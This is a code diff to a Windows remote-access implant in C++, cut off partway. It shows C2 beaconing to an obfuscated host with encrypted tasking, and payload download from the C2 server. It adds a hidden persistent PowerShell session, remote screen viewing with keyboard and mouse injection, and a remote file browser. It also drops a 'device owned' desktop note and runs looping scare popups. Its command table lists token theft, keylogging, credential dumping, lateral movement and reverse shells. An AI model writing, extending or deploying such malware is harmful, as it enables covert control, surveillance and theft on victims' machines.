@@ -5,10 +5,12 @@
 #include "evasion.hpp"
 #include "injection.hpp"
 #include "keylog.hpp"
+#include "vnc.hpp"
 #include "obfuscate.hpp"
 #include <windows.h>
 #include <winhttp.h>
 #include <tlhelp32.h>
+#include <shlobj.h>
 #include <string>
 #include <vector>
 #include <sstream>
@@ -18,6 +20,7 @@
 #include <stdio.h>
 #include <random>
 #include <wincrypt.h>
+#include <cwctype>
 
 // ─── No pragma – linked via build.sh ──────────────────────────────────────
 
@@ -37,13 +40,18 @@ namespace config {
 
     const wchar_t* GetBeaconToken() { EnsureInit(); return s_BeaconToken; }
     const wchar_t* GetUserAgent()   { EnsureInit(); return s_UserAgent;   }
-    const uint16_t C2_PORT = 443;
+
+#ifndef GHOST_C2_PORT
+#define GHOST_C2_PORT 443
+#endif
+    const uint16_t C2_PORT = GHOST_C2_PORT;
 }
 
 static std::wstring g_SessionId;
 static std::vector<BYTE> g_SessionKey;
 static HANDLE g_StolenToken    = NULL;  // primary token from steal_token
 static DWORD  g_BeaconOverride = 0;    // seconds; 0 = use config defaults
+static bool   g_PlaintextMode  = false; // set when the server can't do AES-GCM
 
 // Derive 32-byte key as SHA-256(sessionId)
 static std::vector<BYTE> DeriveKeyFromSessionId(const std::wstring& sessionId) {
@@ -372,12 +380,13 @@ static HttpResponse WinHttpDownload(const std::wstring& url) {
 }
 
 // =====================================================================
-//  C2 HOST
+//  C2 HOST — baked in at build time by build.sh (GHOST_C2_HOST define),
+//  still XOR-obfuscated in the binary via XSW.
 // =====================================================================
 static std::wstring GetC2Host() {
     static wchar_t host[64] = {};
     if (host[0] == L'\0') {
-        auto s = XSW(L"mute-attempt-fossil.ngrok-free.dev");
+        auto s = XSW(GHOST_C2_HOST);
         wcsncpy_s(host, s.str(), _TRUNCATE);
     }
     return std::wstring(host);
@@ -410,12 +419,31 @@ static std::string BuildBeaconJson(const Session& s) {
 // =====================================================================
 BOOL SendBeacon(const Session& session, std::wstring& taskOut) {
     taskOut = L"sleep";
-    std::string body = BuildBeaconJson(session);
+    std::string payload = BuildBeaconJson(session);
+
+    // Payloads are AES-256-GCM encrypted with SHA256(sessionId) unless the
+    // server proved it can't do GCM (downgrade for the rest of this run).
+    std::string body = payload;
+    std::wstring extra;
+    if (!g_PlaintextMode) {
+        std::string blob = AesGcmEncrypt(g_SessionKey, payload);
+        if (!blob.empty()) {
+            body  = blob;
+            extra = L"X-Session-ID: " + session.sessionId + L"\r\nX-Enc: 1";
+        } else {
+            g_PlaintextMode = true;
+        }
+    }
 
     DebugLog(L"Sending beacon to " + GetC2Host());
     HttpResponse resp = WinHttpRequest(GetC2Host(), config::C2_PORT,
-                                       L"POST", L"/beacon", body, L"");
+                                       L"POST", L"/beacon", body, extra);
 
+    if ((resp.status == 400 || resp.status == 401) && !g_PlaintextMode) {
+        DebugLog(L"server rejected encrypted beacon — downgrading to plaintext");
+        g_PlaintextMode = true;
+        return FALSE;
+    }
     if (resp.status != 200) {
         DebugLog(L"Beacon failed: HTTP " + std::to_wstring(resp.status));
         return FALSE;
@@ -423,7 +451,17 @@ BOOL SendBeacon(const Session& session, std::wstring& taskOut) {
 
     std::string cmd = JsonGetString(resp.body, "cmd");
     if (!cmd.empty()) {
-        taskOut = UTF8ToWString(cmd);
+        if (JsonGetString(resp.body, "e") == "1") {
+            // Encrypted blob decrypts to {"cmd":"<task>"} — unpack the field.
+            std::string dec = AesGcmDecrypt(g_SessionKey, cmd);
+            if (dec.empty()) {
+                DebugLog(L"cmd decrypt failed — check session key");
+                return FALSE;
+            }
+            taskOut = UTF8ToWString(JsonGetString(dec, "cmd"));
+        } else {
+            taskOut = UTF8ToWString(cmd);
+        }
         DebugLog(L"Task received: " + taskOut);
     }
     return TRUE;
@@ -436,9 +474,23 @@ BOOL SendResult(const std::wstring& sessionId, const std::wstring& output) {
     std::string sid = JsonEscape(WStringToUTF8(sessionId));
     std::string out = JsonEscape(WStringToUTF8(output));
     std::string body = "{\"session\":\"" + sid + "\",\"output\":\"" + out + "\"}";
+    std::wstring extra;
+    if (!g_PlaintextMode) {
+        std::string blob = AesGcmEncrypt(g_SessionKey, body);
+        if (!blob.empty()) {
+            body  = blob;
+            extra = L"X-Session-ID: " + sessionId + L"\r\nX-Enc: 1";
+        } else {
+            g_PlaintextMode = true;
+        }
+    }
     DebugLog(L"Sending result " + std::to_wstring(output.size()) + L" chars");
     HttpResponse resp = WinHttpRequest(GetC2Host(), config::C2_PORT,
-                                       L"POST", L"/result", body, L"");
+                                       L"POST", L"/result", body, extra);
+    if ((resp.status == 400 || resp.status == 401) && !g_PlaintextMode) {
+        g_PlaintextMode = true;
+        return FALSE;
+    }
     return (resp.status == 200);
 }
 
@@ -760,6 +812,94 @@ static std::wstring HandleUpload(const std::string& args) {
     return L"[UPLOAD:" + UTF8ToWString(fname) + L"]\n" + UTF8ToWString(b64);
 }
 
+// ─── File browser ────────────────────────────────────────────────────────────
+static std::wstring JsonEscapeW(const std::wstring& s) {
+    std::wstring out;
+    out.reserve(s.size() + 8);
+    for (wchar_t c : s) {
+        switch (c) {
+            case L'"':  out += L"\\\""; break;
+            case L'\\': out += L"\\\\"; break;
+            case L'\n': out += L"\\n";  break;
+            case L'\r': out += L"\\r";  break;
+            case L'\t': out += L"\\t";  break;
+            default:    out += c;       break;
+        }
+    }
+    return out;
+}
+
+// `!files`          → [DRIVES] + JSON array of drive letters
+// `!files <path>`   → [FILES] + JSON array [{n,s,d,m}] (500-entry cap)
+static std::wstring HandleFiles(const std::string& args) {
+    std::wstring path = UTF8ToWString(args);
+    size_t a = path.find_first_not_of(L" \t\"");
+    if (a == std::wstring::npos) {
+        wchar_t buf[1024] = {};
+        GetLogicalDriveStringsW(1023, buf);
+        std::wstring out = L"[DRIVES]\n[";
+        bool first = true;
+        for (wchar_t* p = buf; *p; p += 4) {
+            if (!first) out += L",";
+            out += L"\"" + JsonEscapeW(p) + L"\"";
+            first = false;
+        }
+        return out + L"]";
+    }
+    size_t b = path.find_last_not_of(L" \t\"");
+    path = path.substr(a, b - a + 1);
+    if (path.back() != L'\\' && path.back() != L'/') path += L"\\";
+    std::wstring spec = path + L"*";
+
+    WIN32_FIND_DATAW fd;
+    HANDLE h = FindFirstFileW(spec.c_str(), &fd);
+    if (h == INVALID_HANDLE_VALUE)
+        return L"[error: cannot list " + path + L"]";
+
+    std::wstring out = L"[FILES]\n[";
+    int count = 0;
+    bool trunc = false, first = true;
+    do {
+        if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0)
+            continue;
+        if (count >= 500) { trunc = true; break; }
+        if (!first) out += L",";
+        first = false;
+        ULONGLONG size = (static_cast<ULONGLONG>(fd.nFileSizeHigh) << 32) | fd.nFileSizeLow;
+        ULARGE_INTEGER li;
+        li.HighPart = fd.ftLastWriteTime.dwHighDateTime;
+        li.LowPart  = fd.ftLastWriteTime.dwLowDateTime;
+        ULONGLONG epoch = li.QuadPart / 10000000ULL - 11644473600ULL;
+        out += L"{\"n\":\"" + JsonEscapeW(fd.cFileName) +
+               L"\",\"s\":" + std::to_wstring(size) +
+               L",\"d\":" + ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? L"1" : L"0") +
+               L",\"m\":" + std::to_wstring(epoch) + L"}";
+        ++count;
+    } while (FindNextFileW(h, &fd));
+    FindClose(h);
+    if (trunc) out += (first ? L"" : L",") + std::wstring(L"{\"n\":\"__truncated__\",\"s\":0,\"d\":0,\"m\":0}");
+    return out + L"]";
+}
+
+// `!getfile <dest>` — write the payload staged on the server to a local file.
+// The /payload GET is beacon-authenticated with this session's ID.
+static std::wstring HandleGetFile(const std::string& args) {
+    if (args.empty()) return L"Usage: !getfile <dest path>";
+    std::wstring dest = UTF8ToWString(args);
+    HttpResponse r = WinHttpRequest(GetC2Host(), config::C2_PORT, L"GET", L"/payload", "",
+                                    L"X-Session-ID: " + g_SessionId);
+    if (r.status == 404) return L"[error: no payload staged on server]";
+    if (r.status != 200) return L"[error: HTTP " + std::to_wstring(r.status) + L"]";
+    HANDLE hf = CreateFileW(dest.c_str(), GENERIC_WRITE, 0, nullptr,
+                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
+    if (hf == INVALID_HANDLE_VALUE)
+        return L"[error: cannot write " + dest + L"]";
+    DWORD wr = 0;
+    WriteFile(hf, r.body.data(), static_cast<DWORD>(r.body.size()), &wr, nullptr);
+    CloseHandle(hf);
+    return L"[+] wrote " + std::to_wstring(wr) + L" bytes → " + dest;
+}
+
 static std::wstring HandleStealToken(const std::string& /*args*/) {
     // Find winlogon.exe and duplicate its token
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -829,16 +969,27 @@ static std::wstring HandleKeylogDump(const std::string& /*args*/) {
 // =====================================================================
 //  SCREENSHOT — GDI full-screen capture → BMP → base64
 // =====================================================================
-static std::wstring HandleScreenshot(const std::string& /*args*/) {
+static std::wstring HandleScreenshot(const std::string& args) {
     try {
+        // Optional scale percent (15..100) — smaller frames stream faster.
+        int scale = 100;
+        if (!args.empty()) {
+            scale = atoi(args.c_str());
+            if (scale < 15) scale = 15;
+            if (scale > 100) scale = 100;
+        }
         HDC hdcScreen = GetDC(NULL);
         if (!hdcScreen) return L"[error: GetDC failed]";
 
         int cx = GetSystemMetrics(SM_CXSCREEN);
         int cy = GetSystemMetrics(SM_CYSCREEN);
+        int sw = cx * scale / 100;
+        int sh = cy * scale / 100;
+        if (sw < 1) sw = 1;
+        if (sh < 1) sh = 1;
 
         HDC     hdcMem = CreateCompatibleDC(hdcScreen);
-        HBITMAP hbmp   = CreateCompatibleBitmap(hdcScreen, cx, cy);
+        HBITMAP hbmp   = CreateCompatibleBitmap(hdcScreen, sw, sh);
         if (!hdcMem || !hbmp) {
             if (hdcMem) DeleteDC(hdcMem);
             if (hbmp)   DeleteObject(hbmp);
@@ -847,24 +998,27 @@ static std::wstring HandleScreenshot(const std::string& /*args*/) {
         }
 
         HBITMAP hOld = static_cast<HBITMAP>(SelectObject(hdcMem, hbmp));
-        BitBlt(hdcMem, 0, 0, cx, cy, hdcScreen, 0, 0, SRCCOPY | CAPTUREBLT);
+        if (sw == cx && sh == cy)
+            BitBlt(hdcMem, 0, 0, sw, sh, hdcScreen, 0, 0, SRCCOPY | CAPTUREBLT);
+        else
+            StretchBlt(hdcMem, 0, 0, sw, sh, hdcScreen, 0, 0, cx, cy, SRCCOPY | CAPTUREBLT);
         SelectObject(hdcMem, hOld);
         DeleteDC(hdcMem);
         ReleaseDC(NULL, hdcScreen);
 
         BITMAPINFOHEADER bi = {};
         bi.biSize        = sizeof(BITMAPINFOHEADER);
-        bi.biWidth       = cx;
-        bi.biHeight      = -cy;
+        bi.biWidth       = sw;
+        bi.biHeight      = -sh;
         bi.biPlanes      = 1;
         bi.biBitCount    = 24;
         bi.biCompression = BI_RGB;
-        DWORD rowBytes   = ((static_cast<DWORD>(cx) * 3 + 3) & ~3u);
-        bi.biSizeImage   = rowBytes * static_cast<DWORD>(cy);
+        DWORD rowBytes   = ((static_cast<DWORD>(sw) * 3 + 3) & ~3u);
+        bi.biSizeImage   = rowBytes * static_cast<DWORD>(sh);
 
         std::vector<BYTE> pixels(bi.biSizeImage);
         HDC hdcTmp = GetDC(NULL);
-        GetDIBits(hdcTmp, hbmp, 0, static_cast<UINT>(cy),
+        GetDIBits(hdcTmp, hbmp, 0, static_cast<UINT>(sh),
                   pixels.data(), reinterpret_cast<BITMAPINFO*>(&bi), DIB_RGB_COLORS);
         ReleaseDC(NULL, hdcTmp);
         DeleteObject(hbmp);
@@ -891,6 +1045,365 @@ static std::wstring HandleScreenshot(const std::string& /*args*/) {
     } catch (...) {
         return L"[error: screenshot OOM or GDI failure]";
     }
+}
+
+// =====================================================================
+//  LIVE VIEW — inject mouse (optional) and capture a scaled frame in a
+//  single task, so one beacon per frame is enough for the operator's
+//  browser-based interactive remote control.
+// =====================================================================
+static std::wstring HandleLive(const std::string& args) {
+    int scale = 50, nx = -1, ny = -1, btns = 0;
+    sscanf(args.c_str(), "%d %d %d %d", &scale, &nx, &ny, &btns);
+    if (nx >= 0 && ny >= 0)
+        VncInjectMouseNorm(nx, ny, btns);
+    return HandleScreenshot(std::to_string(scale));
+}
+
+// =====================================================================
+//  INPUT — inject mouse/keyboard events from the operator's live view.
+//    !input m <nx> <ny> <btns>   normalized 0..10000 coords, btns bitmask
+//    !input k <vk> <down>        Win32 virtual-key code
+// =====================================================================
+static std::wstring HandleInput(const std::string& args) {
+    if (args.rfind("m ", 0) == 0) {
+        int nx = 0, ny = 0, b = 0;
+        if (sscanf(args.c_str() + 2, "%d %d %d", &nx, &ny, &b) == 3) {
+            VncInjectMouseNorm(nx, ny, b);
+            return L"[+] input";
+        }
+        return L"[error: bad mouse args]";
+    }
+    if (args.rfind("k ", 0) == 0) {
+        int vk = 0, d = 0;
+        if (sscanf(args.c_str() + 2, "%d %d", &vk, &d) == 2) {
+            VncInjectKeyVk(vk, d != 0);
+            return L"[+] input";
+        }
+        return L"[error: bad key args]";
+    }
+    return L"Usage: !input m <nx> <ny> <btns> | !input k <vk> <down>";
+}
+
+// =====================================================================
+//  PERSISTENT POWERSHELL — one hidden powershell.exe stays alive on the
+//  target; `ps1 <line>` feeds it a line and returns the output. State
+//  (variables, modules, Set-Location) persists across tasks.
+// =====================================================================
+extern std::wstring g_ShellCwd;      // defined with the shell-state helpers
+void InitShellCwd();
+
+static HANDLE g_psProc = nullptr;
+static HANDLE g_psWrite = nullptr, g_psRead = nullptr;
+
+static void PsKill() {
+    if (g_psProc) { TerminateProcess(g_psProc, 1); CloseHandle(g_psProc); g_psProc = nullptr; }
+    if (g_psWrite) { CloseHandle(g_psWrite); g_psWrite = nullptr; }
+    if (g_psRead)  { CloseHandle(g_psRead);  g_psRead = nullptr; }
+}
+
+static std::string PsDrain(DWORD maxMs, DWORD idleMs) {
+    std::string out; char buf[4096]; DWORD rd = 0;
+    DWORD t0 = GetTickCount(), lastData = GetTickCount();
+    while (GetTickCount() - t0 < maxMs && out.size() < config::CMD_OUTPUT_MAX) {
+        DWORD avail = 0;
+        if (!PeekNamedPipe(g_psRead, nullptr, 0, nullptr, &avail, nullptr)) break;
+        if (avail == 0) {
+            if (GetTickCount() - lastData >= idleMs) break;
+            Sleep(80); continue;
+        }
+        if (!ReadFile(g_psRead, buf, (avail < sizeof(buf)) ? avail : sizeof(buf), &rd, nullptr) || rd == 0)
+            break;
+        out.append(buf, rd);
+        lastData = GetTickCount();
+    }
+    return out;
+}
+
+static bool PsSpawn() {
+    wchar_t sysRoot[MAX_PATH] = {};
+    GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH);
+    std::wstring cmd = L"\"" + std::wstring(sysRoot) +
+        L"\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\""
+        L" -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command -";
+
+    SECURITY_ATTRIBUTES sa = { sizeof(sa), nullptr, TRUE };
+    HANDLE inR = nullptr, inW = nullptr, outR = nullptr, outW = nullptr;
+    if (!CreatePipe(&outR, &outW, &sa, 0)) return false;
+    if (!CreatePipe(&inR, &inW, &sa, 0)) {
+        CloseHandle(outR); CloseHandle(outW); return false;
+    }
+    SetHandleInformation(outR, HANDLE_FLAG_INHERIT, 0);
+    SetHandleInformation(inW, HANDLE_FLAG_INHERIT, 0);
+
+    STARTUPINFOW si = {};
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+    si.hStdInput  = inR;
+    si.hStdOutput = outW;
+    si.hStdError  = outW;
+
+    PROCESS_INFORMATION pi = {};
+    BOOL ok = CreateProcessW(nullptr, &cmd[0], nullptr, nullptr, TRUE,
+                             CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
+    CloseHandle(inR);
+    CloseHandle(outW);
+    if (!ok) { CloseHandle(inW); CloseHandle(outR); return false; }
+    CloseHandle(pi.hThread);
+    g_psProc = pi.hProcess; g_psWrite = inW; g_psRead = outR;
+
+    // UTF-8 output + start in the implant's tracked working directory
+    InitShellCwd();
+    std::string initUtf8 = WStringToUTF8(
+        L"[Console]::OutputEncoding=[System.Text.Encoding]::UTF8\n"
+        L"try{Set-Location -LiteralPath '" + g_ShellCwd + L"'}catch{}\n");
+    DWORD w = 0;
+    WriteFile(g_psWrite, initUtf8.data(), (DWORD)initUtf8.size(), &w, nullptr);
+    PsDrain(3000, 600);
+    return true;
+}
+
+static std::wstring HandlePsLine(const std::string& args) {
+    if (args.empty())
+        return L"Usage: ps1 <line>  (persistent PowerShell — state survives; psreset restarts)";
+    if (g_psProc) {
+        DWORD code = 0;
+        if (!GetExitCodeProcess(g_psProc, &code) || code != STILL_ACTIVE) PsKill();
+    }
+    if (!g_psProc && !PsSpawn())
+        return L"[error: cannot start powershell]";
+
+    std::string line = args + "\n";
+    DWORD w = 0;
+    if (!WriteFile(g_psWrite, line.data(), (DWORD)line.size(), &w, nullptr)) {
+        PsKill();
+        if (!PsSpawn()) return L"[error: powershell pipe broken, respawn failed]";
+        if (!WriteFile(g_psWrite, line.data(), (DWORD)line.size(), &w, nullptr))
+            return L"[error: powershell write failed]";
+    }
+    std::string out = PsDrain(config::CMD_TIMEOUT_MS, 900);
+    return UTF8ToWString(out.empty() ? "[no output]" : out);
+}
+
+static std::wstring HandlePsReset(const std::string&) {
+    PsKill();
+    return PsSpawn() ? L"[+] PowerShell session restarted" : L"[error: restart failed]";
+}
+
+// ─── Visibility demo — wallpaper + desktop note (fully reversible) ───────────
+// !prank <text>   swap wallpaper to the embedded image, drop READ_ME.txt on
+//                 the desktop, pop it in Notepad
+// !prank off      restore the original wallpaper and remove the note
+static bool WriteResourceToFile(UINT resId, const wchar_t* dest) {
+    HRSRC hr = FindResourceW(nullptr, MAKEINTRESOURCEW(resId), RT_RCDATA);
+    if (!hr) return false;
+    HGLOBAL hg = LoadResource(nullptr, hr);
+    if (!hg) return false;
+    const BYTE* data = static_cast<const BYTE*>(LockResource(hg));
+    DWORD size = SizeofResource(nullptr, hr);
+    if (!data || !size) return false;
+    HANDLE hf = CreateFileW(dest, GENERIC_WRITE, 0, nullptr,
+                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
+    if (hf == INVALID_HANDLE_VALUE) return false;
+    DWORD wr = 0;
+    WriteFile(hf, data, size, &wr, nullptr);
+    CloseHandle(hf);
+    return wr == size;
+}
+
+static std::wstring HandlePrank(const std::string& args) {
+    wchar_t pub[MAX_PATH] = {};
+    if (!GetEnvironmentVariableW(L"PUBLIC", pub, MAX_PATH))
+        lstrcpyW(pub, L"C:\\Users\\Public");
+    std::wstring wallPath = std::wstring(pub) + L"\\ghost_wall.jpg";
+    std::wstring origPath = std::wstring(pub) + L"\\ghost_wall_orig.txt";
+
+    // Restore mode — put the original wallpaper back and clean up.
+    if (args == "off") {
+        HANDLE hf = CreateFileW(origPath.c_str(), GENERIC_READ, FILE_SHARE_READ,
+                                nullptr, OPEN_EXISTING, 0, nullptr);
+        if (hf == INVALID_HANDLE_VALUE) return L"[error: no saved wallpaper to restore]";
+        wchar_t orig[260] = {}; DWORD rd = 0;
+        ReadFile(hf, orig, sizeof(orig) - 2, &rd, nullptr);
+        CloseHandle(hf);
+        if (!orig[0]) return L"[error: saved wallpaper path is empty]";
+        SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (LPVOID)orig,
+                              SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
+        wchar_t desk[MAX_PATH] = {};
+        SHGetFolderPathW(nullptr, CSIDL_DESKTOP, nullptr, 0, desk);
+        DeleteFileW((std::wstring(desk) + L"\\READ_ME.txt").c_str());
+        DeleteFileW(origPath.c_str());
+        DeleteFileW(wallPath.c_str());
+        return L"[+] wallpaper restored, note removed";
+    }
+
+    // Save the current wallpaper once, so `off` can restore it later.
+    if (GetFileAttributesW(origPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
+        wchar_t cur[260] = {}; DWORD sz = sizeof(cur) - 2;
+        RegGetValueW(HKEY_CURRENT_USER, L"Control Panel\\Desktop", L"Wallpaper",
+                     RRF_RT_REG_SZ, nullptr, cur, &sz);
+        HANDLE hf = CreateFileW(origPath.c_str(), GENERIC_WRITE, 0, nullptr,
+                                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
+        if (hf != INVALID_HANDLE_VALUE) {
+            DWORD w = 0;
+            WriteFile(hf, cur, static_cast<DWORD>(wcslen(cur) * 2), &w, nullptr);
+            CloseHandle(hf);
+        }
+    }
+
+    if (!WriteResourceToFile(100, wallPath.c_str()))
+        return L"[error: wallpaper resource missing]";
+    SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, &wallPath[0],
+                          SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
+
+    // Desktop note — UTF-16 LE with BOM so Notepad renders it cleanly.
+    wchar_t desk[MAX_PATH] = {};
+    SHGetFolderPathW(nullptr, CSIDL_DESKTOP, nullptr, 0, desk);
+    std::wstring note = std::wstring(desk) + L"\\READ_ME.txt";
+    std::wstring text = UTF8ToWString(args);
+    if (text.empty())
+        text = L"YOUR DEVICE HAS BEEN OWNED.\r\nAll access was logged.\r\n\r\n- @kalidada";
+    HANDLE hf = CreateFileW(note.c_str(), GENERIC_WRITE, 0, nullptr,
+                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
+    if (hf == INVALID_HANDLE_VALUE)
+        return L"[+] wallpaper set, but the note write failed";
+    BYTE bom[2] = { 0xFF, 0xFE };
+    DWORD w = 0;
+    WriteFile(hf, bom, 2, &w, nullptr);
+    WriteFile(hf, text.c_str(), static_cast<DWORD>(text.size() * 2), &w, nullptr);
+    CloseHandle(hf);
+
+    // Pop the note in Notepad for immediate visibility.
+    std::wstring np = L"notepad.exe \"" + note + L"\"";
+    STARTUPINFOW si = {}; si.cb = sizeof(si);
+    PROCESS_INFORMATION pi = {};
+    if (CreateProcessW(nullptr, &np[0], nullptr, nullptr, FALSE, 0,
+                       nullptr, nullptr, &si, &pi)) {
+        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
+    }
+    return L"[+] wallpaper set, READ_ME.txt on desktop — !prank off to revert";
+}
+
+// ─── Random popup chaos (visibility demo) ────────────────────────────────────
+// !popups      open/close random scare popups at random screen positions
+// !popups off  stop the loop and close whatever is open
+static HANDLE g_popThread = nullptr;
+static volatile LONG g_popRunning = 0;
+static HANDLE g_lastPopProc = nullptr;
+static HWND   g_lastPopWnd  = nullptr;
+
+static const wchar_t* kPopTexts[] = {
+    L"SYSTEM COMPROMISED\n\nEvery keystroke is being logged.",
+    L"REMOTE ACCESS ACTIVE\n\n@kalidada is watching this screen.",
+    L"ALERT: Camera and microphone are ON.",
+    L"Your files are being copied right now.\nDo not turn off the computer.",
+    L"CONNECTION INTERCEPTED\n\nAll saved passwords have been exported.",
+    L"This machine belongs to @kalidada now.",
+    L"Data exfiltration in progress… 67%",
+    L"Firewall: OFF    Antivirus: BYPASSED\nYou are on your own.",
+};
+
+static DWORD PopRand(DWORD lo, DWORD hi) {
+    static std::mt19937 gen(static_cast<unsigned>(
+        std::random_device{}() ^ GetCurrentProcessId()));
+    return lo + gen() % (hi - lo + 1);
+}
+
+static BOOL CALLBACK MovePopWnd(HWND hwnd, LPARAM pid) {
+    DWORD wid = 0;
+    GetWindowThreadProcessId(hwnd, &wid);
+    if (wid == static_cast<DWORD>(pid)) {
+        int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
+        SetWindowPos(hwnd, HWND_TOPMOST,
+                     static_cast<int>(PopRand(0, sw > 500 ? sw - 500 : 100)),
+                     static_cast<int>(PopRand(0, sh > 350 ? sh - 350 : 100)),
+                     0, 0, SWP_NOSIZE | SWP_NOZORDER);
+        g_lastPopWnd = hwnd;
+        return FALSE;
+    }
+    return TRUE;
+}
+
+static DWORD WINAPI PopupThread(LPVOID) {
+    DebugLog(L"[pop] thread started");
+    wchar_t pub[MAX_PATH] = {};
+    if (!GetEnvironmentVariableW(L"PUBLIC", pub, MAX_PATH))
+        lstrcpyW(pub, L"C:\\Users\\Public");
+    std::wstring notePath = std::wstring(pub) + L"\\ghost_pop.txt";
+
+    while (InterlockedCompareExchange(&g_popRunning, 0, 0)) {
+        // random idle gap — deadline-based so it can't wrap, sliced so
+        // '!popups off' reacts within ~200 ms
+        DebugLog(L"[pop] idle start");
+        DWORD idleMs = PopRand(2500, 8000);
+        DWORD idleDeadline = GetTickCount() + idleMs;
+        while (g_popRunning &&
+               static_cast<int>(idleDeadline - GetTickCount()) > 0)
+            Sleep(200);
+        DebugLog(L"[pop] idle done, opening popup");
+        if (!g_popRunning) break;
+
+        const wchar_t* txt = kPopTexts[PopRand(0, ARRAYSIZE(kPopTexts) - 1)];
+        HANDLE hf = CreateFileW(notePath.c_str(), GENERIC_WRITE, 0, nullptr,
+                                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
+        if (hf == INVALID_HANDLE_VALUE) { DebugLog(L"[pop] note write FAILED"); break; }
+        BYTE bom[2] = { 0xFF, 0xFE }; DWORD w = 0;
+        WriteFile(hf, bom, 2, &w, nullptr);
+        WriteFile(hf, txt, static_cast<DWORD>(wcslen(txt) * 2), &w, nullptr);
+        CloseHandle(hf);
+
+        std::wstring cmd = L"notepad.exe \"" + notePath + L"\"";
+        STARTUPINFOW si = {}; si.cb = sizeof(si);
+        PROCESS_INFORMATION pi = {};
+        if (!CreateProcessW(nullptr, &cmd[0], nullptr, nullptr, FALSE, 0,
+                            nullptr, nullptr, &si, &pi)) {
+            DebugLog(L"[pop] CreateProcess FAILED err=" + std::to_wstring(GetLastError()));
+            break;
+        }
+        DebugLog(L"[pop] notepad spawned");
+        if (g_lastPopProc) CloseHandle(g_lastPopProc);
+        g_lastPopProc = pi.hProcess;
+        g_lastPopWnd  = nullptr;
+
+        Sleep(350);  // let the window materialize
+        if (g_popRunning)
+            EnumWindows(MovePopWnd, static_cast<LPARAM>(pi.dwProcessId));
+
+        // random lifetime, then close
+        DWORD lifeDeadline = GetTickCount() + PopRand(2000, 6000);
+        while (g_popRunning &&
+               static_cast<int>(lifeDeadline - GetTickCount()) > 0)
+            Sleep(200);
+        if (g_lastPopWnd) PostMessageW(g_lastPopWnd, WM_CLOSE, 0, 0);
+        if (WaitForSingleObject(pi.hProcess, 800) == WAIT_TIMEOUT)
+            TerminateProcess(pi.hProcess, 0);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+        if (g_lastPopProc == pi.hProcess) { g_lastPopProc = nullptr; g_lastPopWnd = nullptr; }
+    }
+    return 0;
+}
+
+static std::wstring HandlePopups(const std::string& args) {
+    if (args == "off") {
+        if (!g_popRunning) return L"[popups: not running]";
+        InterlockedExchange(&g_popRunning, 0);
+        if (g_popThread) {
+            WaitForSingleObject(g_popThread, 10000);
+            CloseHandle(g_popThread);
+            g_popThread = nullptr;
+        }
+        if (g_lastPopWnd)  PostMessageW(g_lastPopWnd, WM_CLOSE, 0, 0);
+        if (g_lastPopProc) { TerminateProcess(g_lastPopProc, 0); CloseHandle(g_lastPopProc); g_lastPopProc = nullptr; }
+        g_lastPopWnd = nullptr;
+        return L"[+] popups stopped";
+    }
+    if (g_popRunning) return L"[popups: already running — !popups off to stop]";
+    InterlockedExchange(&g_popRunning, 1);
+    g_popThread = CreateThread(nullptr, 0, PopupThread, nullptr, 0, nullptr);
+    if (!g_popThread) { InterlockedExchange(&g_popRunning, 0); return L"[error: thread failed]"; }
+    return L"[+] random popups running — !popups off to stop";
 }
 
 // =====================================================================
@@ -951,8 +1464,17 @@ static const CmdEntry kCmdTable[] = {
     { "!lateral ",     false, HandleLateral },
     { "!creds",        true,  HandleCreds },
     { "ps",            true,  HandlePs },
+    { "ps1 ",          false, HandlePsLine },
+    { "psreset",       true,  HandlePsReset },
     { "download ",     false, HandleDownload },
     { "upload ",       false, HandleUpload },
+    { "!files",        true,  HandleFiles },
+    { "!files ",       false, HandleFiles },
+    { "!getfile ",     false, HandleGetFile },
+    { "!prank ",       false, HandlePrank },
+    { "!prank",        true,  HandlePrank },
+    { "!popups",       true,  HandlePopups },
+    { "!popups ",      false, HandlePopups },
     { "steal_token",   true,  HandleStealToken },
     { "keylog_start",  true,  HandleKeylogStart },
     { "keylog_dump",   true,  HandleKeylogDump },
@@ -962,8 +1484,11 @@ static const CmdEntry kCmdTable[] = {
     { "!clipboard",    true,  HandleClipboard },
     { "!clipboard ",   false, HandleClipboard },
     { "!reverse ",     false, HandleReverse },
+    { "!vnc ",         false, HandleVnc },
     { "!browser",      false, HandleBrowser },
     { "!screenshot",   true,  HandleScreenshot },
+    { "!live ",        false, HandleLive },
+    { "!input ",       false, HandleInput },
     { "!kill ",        false, HandleKillProcess },
     { "!env",          true,  HandleEnvDump },
     { "!getpid",       true,  HandleGetPid },
@@ -974,6 +1499,46 @@ static const CmdEntry kCmdTable[] = {
 // =====================================================================
 //  EXECUTE COMMAND (fallback)
 // =====================================================================
+// ─── Persistent shell state ──────────────────────────────────────────────────
+// Each task runs in a fresh cmd.exe, so the IMPLANT owns the shell state:
+// the working directory and any `set` variables survive across commands.
+std::wstring g_ShellCwd;
+
+static bool IsDirectoryPath(const std::wstring& p) {
+    DWORD a = GetFileAttributesW(p.c_str());
+    return a != INVALID_FILE_ATTRIBUTES && (a & FILE_ATTRIBUTE_DIRECTORY);
+}
+
+void InitShellCwd() {
+    if (!g_ShellCwd.empty()) return;
+    wchar_t tmp[MAX_PATH] = {};
